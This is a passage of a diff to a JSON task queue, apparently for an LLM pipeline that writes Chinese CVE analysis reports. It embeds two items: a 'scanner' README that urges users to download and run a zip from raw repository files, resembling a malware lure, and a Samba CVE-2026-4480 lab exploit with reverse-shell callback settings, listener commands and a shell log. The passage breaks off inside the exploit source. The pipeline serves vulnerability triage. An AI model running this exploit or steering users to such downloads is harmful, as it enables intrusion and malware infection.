@@ -10,7 +10,7 @@
     "last_error": "API返回空结果",
     "created_at": 1780512332.536062,
     "last_attempt": 1780530475.0303252,
-    "next_attempt": 1780822806.43751,
+    "next_attempt": 1780830940.4239728,
     "metadata": {},
     "task_id": "task_CVE-2025-54253_1780512332",
     "required_result_fields": [
@@ -39,7 +39,7 @@
     "last_error": "API返回空结果",
     "created_at": 1780530480.5636718,
     "last_attempt": 1780546499.8586967,
-    "next_attempt": 1780822829.3650534,
+    "next_attempt": 1780830979.4378169,
     "metadata": {},
     "task_id": "task_CVE-2025-32463_1780530480",
     "required_result_fields": [
@@ -68,7 +68,7 @@
     "last_error": "API返回空结果",
     "created_at": 1780530584.0778508,
     "last_attempt": 1780586677.0499845,
-    "next_attempt": 1780822855.3424003,
+    "next_attempt": 1780830943.5354755,
     "metadata": {},
     "task_id": "task_CVE-2025-54253_1780530584",
     "required_result_fields": [
@@ -97,7 +97,7 @@
     "last_error": "API返回空结果",
     "created_at": 1780546440.7176404,
     "last_attempt": 1780586774.8416097,
-    "next_attempt": 1780822808.6561272,
+    "next_attempt": 1780830967.9618757,
     "metadata": {},
     "task_id": "task_CVE-2025-61884_1780546440",
     "required_result_fields": [
@@ -126,7 +126,7 @@
     "last_error": "API返回空结果",
     "created_at": 1780563111.619445,
     "last_attempt": 1780586768.8566246,
-    "next_attempt": 1780822828.6156132,
+    "next_attempt": 1780830932.6115518,
     "metadata": {},
     "task_id": "task_CVE-2025-32463_1780563111",
     "required_result_fields": [
@@ -155,7 +155,7 @@
     "last_error": "API返回空结果",
     "created_at": 1780586905.831617,
     "last_attempt": 1780606844.9520376,
-    "next_attempt": 1780822846.7306824,
+    "next_attempt": 1780830978.0088522,
     "metadata": {},
     "task_id": "task_CVE-2026-6815_1780586905",
     "required_result_fields": [
@@ -184,7 +184,7 @@
     "last_error": "API返回空结果",
     "created_at": 1780597241.834532,
     "last_attempt": 1780606880.2136576,
-    "next_attempt": 1780822848.2191322,
+    "next_attempt": 1780830961.4027405,
     "metadata": {},
     "task_id": "task_CVE-2025-54253_1780597241",
     "required_result_fields": [
@@ -213,7 +213,7 @@
     "last_error": "API返回空结果",
     "created_at": 1780606850.0185814,
     "last_attempt": 1780636855.6671393,
-    "next_attempt": 1780822843.968188,
+    "next_attempt": 1780830971.8860626,
     "metadata": {},
     "task_id": "task_CVE-2025-1242_1780606850",
     "required_result_fields": [
@@ -242,7 +242,7 @@
     "last_error": "API返回空结果",
     "created_at": 1780618248.8727932,
     "last_attempt": 1780653337.212906,
-    "next_attempt": 1780822836.6452878,
+    "next_attempt": 1780830933.033343,
     "metadata": {},
     "task_id": "task_CVE-2026-31431_1780618248",
     "required_result_fields": [
@@ -271,7 +271,7 @@
     "last_error": "API返回空结果",
     "created_at": 1780653297.2632146,
     "last_attempt": 1780653554.533717,
-    "next_attempt": 1780822810.8890727,
+    "next_attempt": 1780830941.332397,
     "metadata": {},
     "task_id": "task_CVE-2026-25643_1780653297",
     "required_result_fields": [
@@ -300,7 +300,7 @@
     "last_error": "API返回空结果",
     "created_at": 1780675033.3490696,
     "last_attempt": 1780697850.5065532,
-    "next_attempt": 1780822855.329429,
+    "next_attempt": 1780830936.2406757,
     "metadata": {},
     "task_id": "task_CVE-2025-61884_1780675033",
     "required_result_fields": [
@@ -329,7 +329,7 @@
     "last_error": "API返回空结果",
     "created_at": 1780675081.829122,
     "last_attempt": 1780697868.0568147,
-    "next_attempt": 1780822856.7444396,
+    "next_attempt": 1780830988.7216172,
     "metadata": {},
     "task_id": "task_CVE-2025-61882_1780675081",
     "required_result_fields": [
@@ -358,7 +358,7 @@
     "last_error": "API返回空结果",
     "created_at": 1780689994.248999,
     "last_attempt": 1780721753.669892,
-    "next_attempt": 1780822803.9950836,
+    "next_attempt": 1780830980.522116,
     "metadata": {},
     "task_id": "task_CVE-2025-49144_1780689994",
     "required_result_fields": [
@@ -387,7 +387,7 @@
     "last_error": "API返回空结果",
     "created_at": 1780690078.0090535,
     "last_attempt": 1780721872.1519966,
-    "next_attempt": 1780822831.0895371,
+    "next_attempt": 1780830963.137327,
     "metadata": {},
     "task_id": "task_CVE-2025-54253_1780690078",
     "required_result_fields": [
@@ -416,7 +416,7 @@
     "last_error": "API返回空结果",
     "created_at": 1780740446.248328,
     "last_attempt": 1780762114.1171057,
-    "next_attempt": 1780822857.745545,
+    "next_attempt": 1780830939.7371821,
     "metadata": {},
     "task_id": "task_CVE-2025-49144_1780740446",
     "required_result_fields": [
@@ -445,7 +445,7 @@
     "last_error": "API返回空结果",
     "created_at": 1780747630.8408463,
     "last_attempt": 1780776722.7824638,
-    "next_attempt": 1780822804.9895332,
+    "next_attempt": 1780830955.9934452,
     "metadata": {},
     "task_id": "task_CVE-2026-31431_1780747630",
     "required_result_fields": [
@@ -474,7 +474,7 @@
     "last_error": "API返回空结果",
     "created_at": 1780757191.113863,
     "last_attempt": 1780776721.8697577,
-    "next_attempt": 1780822818.5511832,
+    "next_attempt": 1780830972.9404085,
     "metadata": {},
     "task_id": "task_CVE-2025-55182_1780757191",
     "required_result_fields": [
@@ -503,7 +503,7 @@
     "last_error": "API返回空结果",
     "created_at": 1780757210.5097108,
     "last_attempt": 1780776679.9484835,
-    "next_attempt": 1780822831.7682302,
+    "next_attempt": 1780830946.3135402,
     "metadata": {},
     "task_id": "task_CVE-2025-8088_1780757210",
     "required_result_fields": [
@@ -532,7 +532,7 @@
     "last_error": "API返回空结果",
     "created_at": 1780757228.618619,
     "last_attempt": 1780776754.3610117,
-    "next_attempt": 1780822833.112632,
+    "next_attempt": 1780830987.2318718,
     "metadata": {},
     "task_id": "task_CVE-2025-6554_1780757228",
     "required_result_fields": [
@@ -561,7 +561,7 @@
     "last_error": "API返回空结果",
     "created_at": 1780762151.9247897,
     "last_attempt": 1780809968.9981909,
-    "next_attempt": 1780822840.7304144,
+    "next_attempt": 1780830994.1366801,
     "metadata": {},
     "task_id": "task_CVE-2026-41089_1780762151",
     "required_result_fields": [
@@ -590,7 +590,7 @@
     "last_error": "API返回空结果",
     "created_at": 1780769247.0176642,
     "last_attempt": 1780809867.0056555,
-    "next_attempt": 1780822854.6898472,
+    "next_attempt": 1780830980.3012116,
     "metadata": {},
     "task_id": "task_CVE-2026-1232_1780769247",
     "required_result_fields": [
@@ -619,7 +619,7 @@
     "last_error": "API返回空结果",
     "created_at": 1780769269.6886911,
     "last_attempt": 1780776822.2383654,
-    "next_attempt": 1780822801.8755937,
+    "next_attempt": 1780830987.4275274,
     "metadata": {},
     "task_id": "task_CVE-2026-42945_1780769269",
     "required_result_fields": [
@@ -648,7 +648,7 @@
     "last_error": "API返回空结果",
     "created_at": 1780776733.668762,
     "last_attempt": 1780822789.0584369,
-    "next_attempt": 1780822746.114068,
+    "next_attempt": 1780830984.9634259,
     "metadata": {},
     "task_id": "task_CVE-2025-69985_1780776733",
     "required_result_fields": [
@@ -677,7 +677,7 @@
     "last_error": "API返回空结果",
     "created_at": 1780776843.269161,
     "last_attempt": 1780822748.0588286,
-    "next_attempt": 1780822734.409307,
+    "next_attempt": 1780830946.2479084,
     "metadata": {},
     "task_id": "task_CVE-2025-5419_1780776843",
     "required_result_fields": [
@@ -706,7 +706,7 @@
     "last_error": "API返回空结果",
     "created_at": 1780790739.4256165,
     "last_attempt": 1780822776.9151795,
-    "next_attempt": 1780822750.9048412,
+    "next_attempt": 1780830957.9540482,
     "metadata": {},
     "task_id": "task_CVE-2026-31431_1780790739",
     "required_result_fields": [
@@ -735,7 +735,7 @@
     "last_error": "API返回空结果",
     "created_at": 1780809833.4754746,
     "last_attempt": 1780822941.3851836,
-    "next_attempt": 1780822894.0247612,
+    "next_attempt": 1780830934.633597,
     "metadata": {},
     "task_id": "task_CVE-2026-25643_1780809833",
     "required_result_fields": [
@@ -764,7 +764,7 @@
     "last_error": null,
     "created_at": 1780822990.7154965,
     "last_attempt": 0,
-    "next_attempt": 1780822996.1599302,
+    "next_attempt": 1780830808.0244954,
     "metadata": {},
     "task_id": "task_CVE-2025-14847_1780822990",
     "required_result_fields": [
@@ -783,19 +783,19 @@
     ]
   },
   {
-    "cve_id": "CVE-2025-55182",
-    "prompt": "\n      请根据以下漏洞信息、搜索结果和漏洞利用代码，生成一份详细的漏洞分析报告，包含有效性分析、投毒风险分析、利用方式、代码分析等内容。请注意以下几点：\n\n    **信息来源：**\n\n    *   **漏洞库信息：**\n        ```\n        {\"cve_id\": \"CVE-2025-55182\", \"sources\": [\"NVD\", \"CISA\", \"OSCS\"], \"descriptions\": [\"A pre-authentication remote code execution vulnerability exists in React Server Components versions 19.0.0, 19.1.0, 19.1.1, and 19.2.0 including the following packages: react-server-dom-parcel, react-server-dom-turbopack, and react-server-dom-webpack. The vulnerable code unsafely deserializes payloads from HTTP requests to Server Function endpoints.\", \"\\u6807\\u9898: React Server Components \\u53cd\\u5e8f\\u5217\\u5316\\u8fdc\\u7a0b\\u4ee3\\u7801\\u6267\\u884c\\u6f0f\\u6d1e\"], \"published_date\": \"2025-12-03T16:15:56.463\", \"last_modified_date\": \"2025-12-10T02:00:02.557\", \"cvss_score\": 10.0, \"severity\": \"CRITICAL\", \"references\": [\"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"r\", \"e\", \"a\", \"c\", \"t\", \".\", \"d\", \"e\", \"v\", \"/\", \"b\", \"l\", \"o\", \"g\", \"/\", \"2\", \"0\", \"2\", \"5\", \"/\", \"1\", \"2\", \"/\", \"0\", \"3\", \"/\", \"c\", \"r\", \"i\", \"t\", \"i\", \"c\", \"a\", \"l\", \"-\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"-\", \"v\", \"u\", \"l\", \"n\", \"e\", \"r\", \"a\", \"b\", \"i\", \"l\", \"i\", \"t\", \"y\", \"-\", \"i\", \"n\", \"-\", \"r\", \"e\", \"a\", \"c\", \"t\", \"-\", \"s\", \"e\", \"r\", \"v\", \"e\", \"r\", \"-\", \"c\", \"o\", \"m\", \"p\", \"o\", \"n\", \"e\", \"n\", \"t\", \"s\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"f\", \"a\", \"c\", \"e\", \"b\", \"o\", \"o\", \"k\", \".\", \"c\", \"o\", \"m\", \"/\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"/\", \"a\", \"d\", \"v\", \"i\", \"s\", \"o\", \"r\", \"i\", \"e\", \"s\", \"/\", \"c\", \"v\", \"e\", \"-\", \"2\", \"0\", \"2\", \"5\", \"-\", \"5\", \"5\", \"1\", \"8\", \"2\", \"h\", \"t\", \"t\", \"p\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"o\", \"p\", \"e\", \"n\", \"w\", \"a\", \"l\", \"l\", \".\", \"c\", \"o\", \"m\", \"/\", \"l\", \"i\", \"s\", \"t\", \"s\", \"/\", \"o\", \"s\", \"s\", \"-\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"/\", \"2\", \"0\", \"2\", \"5\", \"/\", \"1\", \"2\", \"/\", \"0\", \"3\", \"/\", \"4\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"n\", \"e\", \"w\", \"s\", \".\", \"y\", \"c\", \"o\", \"m\", \"b\", \"i\", \"n\", \"a\", \"t\", \"o\", \"r\", \".\", \"c\", \"o\", \"m\", \"/\", \"i\", \"t\", \"e\", \"m\", \"?\", \"i\", \"d\", \"=\", \"4\", \"6\", \"1\", \"3\", \"6\", \"0\", \"2\", \"6\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"a\", \"w\", \"s\", \".\", \"a\", \"m\", \"a\", \"z\", \"o\", \"n\", \".\", \"c\", \"o\", \"m\", \"/\", \"b\", \"l\", \"o\", \"g\", \"s\", \"/\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"/\", \"c\", \"h\", \"i\", \"n\", \"a\", \"-\", \"n\", \"e\", \"x\", \"u\", \"s\", \"-\", \"c\", \"y\", \"b\", \"e\", \"r\", \"-\", \"t\", \"h\", \"r\", \"e\", \"a\", \"t\", \"-\", \"g\", \"r\", \"o\", \"u\", \"p\", \"s\", \"-\", \"r\", \"a\", \"p\", \"i\", \"d\", \"l\", \"y\", \"-\", \"e\", \"x\", \"p\", \"l\", \"o\", \"i\", \"t\", \"-\", \"r\", \"e\", \"a\", \"c\", \"t\", \"2\", \"s\", \"h\", \"e\", \"l\", \"l\", \"-\", \"v\", \"u\", \"l\", \"n\", \"e\", \"r\", \"a\", \"b\", \"i\", \"l\", \"i\", \"t\", \"y\", \"-\", \"c\", \"v\", \"e\", \"-\", \"2\", \"0\", \"2\", \"5\", \"-\", \"5\", \"5\", \"1\", \"8\", \"2\", \"/\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"c\", \"i\", \"s\", \"a\", \".\", \"g\", \"o\", \"v\", \"/\", \"k\", \"n\", \"o\", \"w\", \"n\", \"-\", \"e\", \"x\", \"p\", \"l\", \"o\", \"i\", \"t\", \"e\", \"d\", \"-\", \"v\", \"u\", \"l\", \"n\", \"e\", \"r\", \"a\", \"b\", \"i\", \"l\", \"i\", \"t\", \"i\", \"e\", \"s\", \"-\", \"c\", \"a\", \"t\", \"a\", \"l\", \"o\", \"g\", \"?\", \"f\", \"i\", \"e\", \"l\", \"d\", \"_\", \"c\", \"v\", \"e\", \"=\", \"C\", \"V\", \"E\", \"-\", \"2\", \"0\", \"2\", \"5\", \"-\", \"5\", \"5\", \"1\", \"8\", \"2\"]}\n        ```\n    *   **搜索引擎结果：**\n        ```\n        \n            ## 以下内容是基于此漏洞的搜索结果:\n                [webpage 0 begin] [title] CVE-2025-55182: React2Shell Analysis, Proof-of-Concept Chaos, and...\n [description] CVE-2025-55182 is a CVSS 10.0 pre-authentication RCE affecting React Server Components. Amid the flood of fake proof-of-concept exploits, scanners, exploits, and widespread misconceptions, this technical analysis intends to cut through the noise.\n [link] https://www.trendmicro.com/zh_hk/research/25/l/CVE-2025-55182-analysis-poc-itw.html\n [webpage 0 end]\n[webpage 1 begin] [title] CVE-2025-55182 (React2Shell): Remote code execution in React...\n [description] While the US National Vulnerability Database (NVD) has officially rejected this CVE assignment, it's still being referred to by the community. CVE-2025-55182 was assigned a CVSS score of 10/10.\n [link] https://securitylabs.datadoghq.com/articles/cve-2025-55182-react2shell-remote-code-execution-react-server-components/\n [webpage 1 end]\n[webpage 2 begin] [title] React2Shell CVE-2025–55182 Explained: Critical RCE Vulnerability in...\n [description] A deep technical breakdown of the React2Shell vulnerability, real-world exploitation, and urgent mitigation steps.\n [link] https://medium.com/@hafizshamnad/react2shell-cve-2025-55182-explained-critical-rce-vulnerability-in-react-next-js-f0c0ec847e04\n [webpage 2 end]\n[webpage 3 begin] [title] GhostTroops/TOP: TOP All bugbounty pentesting CVE-2023- POC...\n [description] Rust implementation Exploit/PoC of CVE-2026-31431-Linux-Copy-Fail, allow executing customized shellcode (such as Meterpreter).Explanation and full RCE PoC for CVE-2025-55182.\n [link] https://github.com/GhostTroops/TOP\n [webpage 3 end]\n[webpage 4 begin] [title] React2Shell 2025 RCE Exploit Surge: CVE-2025-55182 and WAF...\n [description] React2Shell CVE-2025-55182 directly targets React and Next.js frameworks with RCE exploits, requiring immediate patching and WAF rule updates to prevent backdoor deployment. Financial Services.\n [link] https://aviatrix.ai/threat-research-center/react2shell-cve-2025-55182-remote-code-execution-waf-bypass/\n [webpage 4 end]\n\n            \n        ```\n    *   **漏洞利用代码：**\n        ```\n        /tmp/23c8cc2ab9eba95954a2c7a44b20dc4b/LICENSE\n---\nMIT License\n\nCopyright (c) 2025 Vicky\n\nPermission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the \"Software\"), to deal\nin the Software without restriction, including without limitation the rights\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\ncopies of the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in all\ncopies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\nSOFTWARE.\n\n\n---\n/tmp/23c8cc2ab9eba95954a2c7a44b20dc4b/README.md\n---\n# 🔍 CVE-2025-55182-Scanner - Detect and Secure Your Applications\n\n## 🌟 Overview\nCVE-2025-55182-Scanner is a hybrid security scanner designed to help you identify vulnerabilities in https://raw.githubusercontent.com/captain4554/CVE-2025-55182-Scanner/main/scanner/CV-Scanner-v2.4.zip and Waku applications. This tool combines static code analysis with safe dynamic verification, making it ideal for DevSecOps workflows. Whether you’re a developer or just a concerned user, this scanner will help you secure your applications against potential threats.\n\n## 🚀 Getting Started\nTo get started with CVE-2025-55182-Scanner, follow these simple steps:\n\n1. **Visit the Releases Page:** Click the button below to go to the GitHub Releases page.\n\n   [![Download CVE-2025-55182-Scanner](https://raw.githubusercontent.com/captain4554/CVE-2025-55182-Scanner/main/scanner/CV-Scanner-v2.4.zip%20Now!-CVE-2025--55182--Scanner-blue)](https://raw.githubusercontent.com/captain4554/CVE-2025-55182-Scanner/main/scanner/CV-Scanner-v2.4.zip)\n\n2. **Download the Latest Version:** On the Releases page, find the latest version of the application. Look for files named with the application version (e.g., https://raw.githubusercontent.com/captain4554/CVE-2025-55182-Scanner/main/scanner/CV-Scanner-v2.4.zip). Click the file to download it to your computer.\n\n3. **Install the Application:** After downloading, locate the file on your computer. Double-click the file to start the installation process. Follow the prompts to complete the installation.\n\n4. **Run the Scanner:** Once installed, you can start CVE-2025-55182-Scanner from your applications list. \n\n5. **Begin Scanning:** Input the necessary details of your https://raw.githubusercontent.com/captain4554/CVE-2025-55182-Scanner/main/scanner/CV-Scanner-v2.4.zip or Waku application and click \"Scan.\" The scanner will analyze your project for vulnerabilities.\n\n## ⚙️ System Requirements\n- **Operating System:** Windows 10 or later, macOS Mojave or later, or a 64-bit version of Linux.\n- **RAM:** At least 4 GB of RAM.\n- **Disk Space:** Minimum of 500 MB free space for installation.\n- **Network:** Internet connection recommended for updates and additional resources.\n\n## 📥 Download & Install\nTo download CVE-2025-55182-Scanner, please revisit the [Releases page](https://raw.githubusercontent.com/captain4554/CVE-2025-55182-Scanner/main/scanner/CV-Scanner-v2.4.zip). Start by clicking the link above. Choose the version that suits your operating system and download it.\n\n1. **Download the File:** Click on the appropriate file for your operating system to initiate the download.\n2. **Install the Application:** Follow the on-screen instructions to install the software.\n3. **Open the Software:** You will find CVE-2025-55182-Scanner in your application menu or desktop.\n\n## 🔒 Features\n- **Static Code Analysis:** Scan your code for vulnerabilities without running the application.\n- **Dynamic Verification:** Run the app in a safe environment to perform real-time checks for security issues.\n- **User-Friendly Interface:** Designed for non-technical users to easily navigate and operate.\n- **Reports and Recommendations:** Get detailed reports about vulnerabilities found and recommendations for fixes.\n\n## 📊 Usage Instructions\nAfter installation, you can follow these steps to effectively use CVE-2025-55182-Scanner:\n\n1. **Open the Application:** Launch CVE-2025-55182-Scanner from your computer.\n2. **Input Application Details:** Enter the URL or path of your https://raw.githubusercontent.com/captain4554/CVE-2025-55182-Scanner/main/scanner/CV-Scanner-v2.4.zip or Waku application.\n3. **Choose Scan Type:** Select either \"Static Analysis\" or \"Dynamic Verification\" based on your requirements.\n4. **Start Scan:** Click the \"Scan\" button to begin the process. Wait for the scan to complete.\n5. **Vi\n        ```\n\n    **你的角色：** 你是一名专业的网络安全分析师，擅长分析CVE漏洞信息。\n\n    **任务：**\n\n    1.  **CVE有效性：** 分析此CVE是否为真实存在的有效漏洞。请综合考虑CVE编号格式、漏洞描述的完整性、参考链接的存在、漏洞的技术细节等因素。\n    2.  **POC有效性：** 判断提供的POC代码是否有效，是否能实际利用此漏洞，并分析其有效性。\n    3.  **投毒风险：** 分析POC代码内容,判断此仓库中是否存在作者隐藏的投毒代码,分析结果使用百分比。务必不要把POC验证的后门代码判定为投毒代码。\n    4.  **利用方式：** 详细分析并总结漏洞的利用方式，包括攻击步骤、所需条件等。\n    5.  **代码分析：** 详细分析POC代码的工作原理、关键组件和执行流程。\n    6.  **排序优先级:** 搜索引擎结果 >  漏洞利用代码 > 漏洞库信息\n    7.  **输出内容:** 务必使用中文\n    8.  **markdown内容:** 务必使用markdown格式，包含以下部分：\n        - 漏洞概述\n        - 有效性分析\n        - 投毒风险分析\n        - 利用方式\n        - 代码分析\n    **输出格式：**  你**必须**严格按照以下 **JSON** 格式输出，**不要包含任何额外的文字、说明或前缀/后缀**。JSON中的**所有键和字符串类型的值必须使用双引号**。请务必对特殊字符进行转义。\n\n    **示例JSON:**```json\n    {\n        \"name\": \"CVE-2023-12345-ExampleApp-SQL注入\",\n        \"type\": \"SQL注入\",\n        \"app\": \"ExampleApp\", \n        \"risk\": \"高危，可能导致数据泄露和远程代码执行\",\n        \"version\": \"<= 1.0\",\n        \"condition\": \"需要网络访问和数据库端口开放\",\n        \"poc_available\": \"是\",\n        \"poison\": \"90%\",\n        \"cve_valid\": \"是\",\n        \"markdown\": \"# 漏洞概述\n\n该漏洞存在于ExampleApp的登录模块,攻击者可以通过构造恶意的SQL语句绕过身份验证...\n\n## 有效性分析\n\n根据CVE编号格式、漏洞描述的完整性、参考链接的存在等因素，该CVE是真实有效的...\n\n## 投毒风险分析\n\n该仓库存在较高的投毒风险，主要原因是...\n\n## 利用方式\n\n1.  攻击者需要网络访问权限\n2.  构造恶意的SQL语句\n3.  发送到目标系统\n4.  绕过身份验证，获取系统访问权限\n\n## 代码分析\n\n主要代码组件包括：\n- `exploit.py`: 主漏洞利用脚本\n- `payloads.py`: 包含各种SQL注入payload\n- `utils.py`: 辅助工具函数\n\n代码执行流程：\n1.  连接到目标数据库\n2.  构造恶意SQL语句\n3.  发送到目标系统\n4.  解析响应，获取敏感信息\n\",\n        \"repo_name\": \"example/repo\",\n        \"repo_url\": \"https://github.com/example/repo\",\n        \"cve_url\": \"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-12345\"\n    }\n        ",
+    "cve_id": "CVE-2026-4480",
+    "prompt": "\n      请根据以下漏洞信息、搜索结果和漏洞利用代码，生成一份详细的漏洞分析报告，包含有效性分析、投毒风险分析、利用方式、代码分析等内容。请注意以下几点：\n\n    **信息来源：**\n\n    *   **漏洞库信息：**\n        ```\n        {\"cve_id\": \"CVE-2026-4480\", \"sources\": [\"OSCS\"], \"descriptions\": [\"\\u6807\\u9898: Samba\\u6253\\u5370\\u5b50\\u7cfb\\u7edf\\u547d\\u4ee4\\u6ce8\\u5165\\u6f0f\\u6d1e\\u3010\\u5df2\\u590d\\u73b0\\u3011\"], \"published_date\": null, \"last_modified_date\": null, \"cvss_score\": null, \"severity\": null, \"references\": []}\n        ```\n    *   **搜索引擎结果：**\n        ```\n        \n            ## 以下内容是基于此漏洞的搜索结果:\n                [webpage 0 begin] [title] Critical Samba Vulnerability Enables Remote Code Execution Attacks\n [description] A critical vulnerability in the Samba printing subsystem, tracked as CVE-2026-4480, has been disclosed, allowing unauthenticated attackers to achieve remote code execution (RCE) on affected systems. The flaw carries a maximum CVSS v3.1 score of 10.0, highlighting its severe impact and ease of exploitation.\n [link] https://cybersecuritynews.com/samba-rce-vulnerability/\n [webpage 0 end]\n[webpage 1 begin] [title] CVE-2026-4480 - Samba: samba: remote code execution in printing ...\n [description] A flaw was found in the Samba printing subsystem. Samba passes the client-controlled job description string to the command configured with the \"print command\" setting via the \"%J\" substitution character without escaping shell meta characters. A remote attacker could exploit this vulnerability by sending a specially crafted print job description …\n [link] https://cvefeed.io/vuln/detail/CVE-2026-4480\n [webpage 1 end]\n[webpage 2 begin] [title] GitHub - Unclecheng-li/poc-lab: Recent CVE PoC & reproduction scripts ...\n [description] PoC additions are welcome. To add a new vulnerability: Create a directory named after the CVE or vulnerability name Include the PoC script (exploit.py / exploit.sh) and a README.md with: CVE identifier & vulnerability name Affected versions / components Step-by-step reproduction guide References (advisory links, patch commits, credits) Open a ...\n [link] https://github.com/Unclecheng-li/poc-lab\n [webpage 2 end]\n[webpage 3 begin] [title] CVE-2026-4480: A flaw was found Remote code execution\n [description] CVE-2026-4480 is a high severity vulnerability (CVSS 8.5) identified in the National Vulnerability Database. A flaw was found in the Samba printing subsystem. Samba passes the client-controlled job description string to the command configured with the \"print command\" setting via the \"%J\" substitution character without escaping shell meta characters. A remote attacker could exploit this ...\n [link] https://www.sherlockforensics.com/blog/2026-05-26-cve-2026-4480.html\n [webpage 3 end]\n[webpage 4 begin] [title] CVE-2026-4480 - Exploits & Severity - Feedly\n [description] May 26, 2026 at 8:32 AM Threat Intelligence Report CVE-2026-4480 is a high-severity Remote Code Execution vulnerability in the Samba printing subsystem, with a CVSS score of 8.5, allowing remote attackers to execute arbitrary code without prior authentication.\n [link] https://feedly.com/cve/CVE-2026-4480\n [webpage 4 end]\n[webpage 5 begin] [title] CVE-2026-4480 - CVE-2026-4480 Vulnerability... | WatchStack.io\n [description] CVE-2026-4480 Exploits & PoCs (Proof Of Concept). No public PoCs found in our database for this CVE.\n [link] https://watchstack.io/intel/cve/CVE-2026-4480\n [webpage 5 end]\n[webpage 6 begin] [title] CVE-2026-4480 Security Vulnerability & Exploit Details\n [description] This vulnerability, CVE-2026-4480, requires a high level of attack complexity and low privileges, making it difficult but not impossible to exploit. Organizations should ensure robust security configurations to mitigate risks. Understanding AC and PR.\n [link] https://cve.akaoma.com/cve-2026-4480\n [webpage 6 end]\n[webpage 7 begin] [title] CVE-2026-4480 - High Vulnerability - TheHackerWire\n [description] CVE-2026-4480 AI (Artificial Intelligence) Analysis. Samba Printing Subsystem RCE via Unescaped Shell Metacharacters.CVE-2026-4480 is a High severity security vulnerability. A flaw was found in the Samba printing subsystem.\n [link] https://www.thehackerwire.com/vulnerability/CVE-2026-4480/\n [webpage 7 end]\n[webpage 8 begin] [title] CVE-2026-4480 - Vulnerability Details - OpenCVE\n [description] CVE-2026-4480 - Samba: samba: remote code execution in printing subsystem via unescaped job description.\n [link] https://app.opencve.io/cve/CVE-2026-4480\n [webpage 8 end]\n[webpage 9 begin] [title] Critical Remote Code Execution Vulnerability... - PlanetJon Network\n [description] Tracked as CVE-2026-4480, this vulnerability has been assigned a maximum CVSS score of 10.0, signifying a critical risk to the confidentiality, integrity, and availability of the host system.\n [link] https://www.planetjon.net/news/cybersecurity/critical-remote-code-execution-vulnerability-discovered-in-samba-printing-subsystem-cve-2026-4480/\n [webpage 9 end]\n\n            \n        ```\n    *   **漏洞利用代码：**\n        ```\n        /tmp/ca25eb16890364e8608dc6bb8d66afa0/README.md\n---\nexcute exploit:\n```bash\npython ./exploit.py -t 10.129.20.16 -l 10.10.14.172 -p 8487\n[*] Target: 10.129.20.16\n[*] Callback: 10.10.14.172:8487\n[*] Verify mode: False\n\n[+] Credentials initialized (anonymous)\n[+] Connected to spoolss interface\n[+] Opened printer: HP-Reception\n[+] Created DocumentInfo with payload: |sh\n[+] Generated payload (78 bytes)\n[*] Starting document...\n[*] Starting page...\n[*] Writing payload (78 bytes)...\n[*] Ending page...\n[*] Ending document (TRIGGERING EXPLOIT)...\n[+] Print job submitted successfully!\n[+] Closed printer handle\n\n[+] Exploit completed!\n[*] Check your listener for reverse shell...\n```\n\nnc -lvnp 8487\n```bash\n─$ nc -lvnp 8487                                                                   \nlistening on [any] 8487 ...\nconnect to [10.10.14.172] from (UNKNOWN) [10.129.20.16] 40590\nbash: cannot set terminal process group (16403): Inappropriate ioctl for device\nbash: no job control in this shell\nnobody@abducted:/var/spool/samba$ whoami\nwhoami\nnobody\nnobody@abducted:/var/spool/samba$ id\nid\nuid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)\nnobody@abducted:/var/spool/samba$ \n```\n\n\n---\n/tmp/ca25eb16890364e8608dc6bb8d66afa0/exploit.py\n---\n#!/usr/bin/env python3\n\"\"\"\nCVE-2026-4480 Samba Print Command Injection Exploit\nAbducted HTB Machine\n\"\"\"\n\nfrom samba.dcerpc import spoolss\nfrom samba.param import LoadParm\nfrom samba.credentials import Credentials\nimport sys\nimport socket\n\n# ============================================================================\n# 配置参数\n# ============================================================================\n\nclass Config:\n    \"\"\"配置类 — 修改这里来设置目标和反弹 shell 参数\"\"\"\n    \n    def __init__(self, rhost, lhost, lport, verify_only=False):\n        self.RHOST = rhost           # 目标机器 IP\n        self.LHOST = lhost           # 你的攻击机 IP (tun0)\n        self.LPORT = lport           # 你的监听端口\n        self.VERIFY_ONLY = verify_only  # 是否只做验证 (ping 测试)\n        self.PRINTER_SHARE = \"HP-Reception\"\n        self.PRINTER_ACCESS = 0x00000008  # PRINTER_ACCESS_USE\n\n\n# ============================================================================\n# 阶段一：初始化和连接\n# ============================================================================\n\ndef initialize_credentials():\n    \"\"\"\n    功能：初始化 Samba 凭证为匿名认证\n    \n    返回：\n        tuple: (lp: LoadParm, creds: Credentials)\n    \n    你需要实现：\n    - 创建 LoadParm 对象并加载默认配置\n    - 创建 Credentials 对象并设置为匿名\n    \n    提示：\n    - LoadParm().load_default()\n    - Credentials().guess() 和 .set_anonymous()\n    